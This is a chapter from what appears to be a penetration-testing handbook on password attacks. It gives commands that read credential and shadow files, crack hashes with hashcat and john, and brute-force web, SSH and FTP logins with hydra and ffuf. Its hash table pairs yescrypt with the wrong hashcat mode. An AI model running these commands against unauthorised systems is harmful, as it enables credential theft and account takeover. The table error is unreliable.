[◀ Prev: Post-Exploitation](11-post-exploitation.md) · [🏠 Index](README.md) · [Next: Service Exploitation ▶](13-service-exploitation.md)

---

# 12 · Password Attacks & Credential Hunting

## 12.1 Finding Credentials in the Filesystem

```bash
# Common credential locations
find / -name '*.conf' -o -name '*.config' -o -name '*.cfg' 2>/dev/null | head -30
find / -name '.env' -o -name '*.env' 2>/dev/null
find /var/www -name 'config.php' -o -name 'database.php' 2>/dev/null | xargs cat

# Grep for password strings
grep -r 'password\|passwd\|pass\|pwd' /var/www/ 2>/dev/null | grep -v '.js\|.css' | grep -v '#'
grep -r 'PASSWORD\|DB_PASS\|SECRET_KEY' / --include='*.py' --include='*.env' --include='*.conf' 2>/dev/null

# Check for common credential files
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
cat /etc/mysql/my.cnf 2>/dev/null
cat /etc/apache2/sites-enabled/*.conf 2>/dev/null

# Check all home directories
ls -laR /home/ 2>/dev/null | head -50
find /home -name '*.txt' -o -name '*.pdf' -o -name 'notes*' 2>/dev/null | xargs cat 2>/dev/null
```

## 12.2 Hash Identification and Cracking

| Hash Format | Type | Hashcat Mode | John Format |
| --- | --- | --- | --- |
| `$1$salt$hash` | MD5crypt (Linux) | `-m 500` | `--format=md5crypt` |
| `$2a$12$...` | bcrypt | `-m 3200` | `--format=bcrypt` |
| `$5$salt$hash` | SHA-256crypt | `-m 7400` | `--format=sha256crypt` |
| `$6$salt$hash` | SHA-512crypt (Linux) | `-m 1800` | `--format=sha512crypt` |
| 32 hex chars | MD5 | `-m 0` | `--format=raw-md5` |
| 40 hex chars | SHA1 | `-m 100` | `--format=raw-sha1` |
| 64 hex chars | SHA256 | `-m 1400` | `--format=raw-sha256` |
| `$P$hash` (WordPress) | PHPass | `-m 400` | `--format=phpass` |
| `$apr1$hash` (Apache) | MD5-APR | `-m 1600` | `--format=md5crypt` |
| `$y$hash` | yescrypt | `-m 1800` | `--format=crypt` |

```bash
# Identify hash type
hash-identifier 'HASH_STRING'
hashid 'HASH_STRING'
name-that-hash -t 'HASH_STRING'

# hashcat — GPU cracking
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1800 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 hashes.txt rockyou.txt --attack-mode 3 '?a?a?a?a?a?a'    # Brute force 6 chars

# john — CPU cracking
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --format=sha512crypt --wordlist=rockyou.txt
john hashes.txt --rules=All --wordlist=rockyou.txt
john hashes.txt --show

# Unshadow (combine /etc/passwd + /etc/shadow for john)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```

## 12.3 Brute Force Login Pages

```bash
# Hydra — versatile brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  '/login:username=^USER^&password=^PASS^:Invalid credentials' $TARGET

# Hydra SSH
hydra -L users.txt -P rockyou.txt $TARGET ssh -t 4

# Hydra FTP
hydra -l admin -P rockyou.txt ftp://$TARGET

# ffuf login brute force
ffuf -u http://$TARGET/login -X POST \
  -d 'username=admin&password=FUZZ' \
  -w /usr/share/wordlists/rockyou.txt \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -mc 302 -o web/login_brute.json
```

---

[◀ Prev: Post-Exploitation](11-post-exploitation.md) · [🏠 Index](README.md) · [Next: Service Exploitation ▶](13-service-exploitation.md)
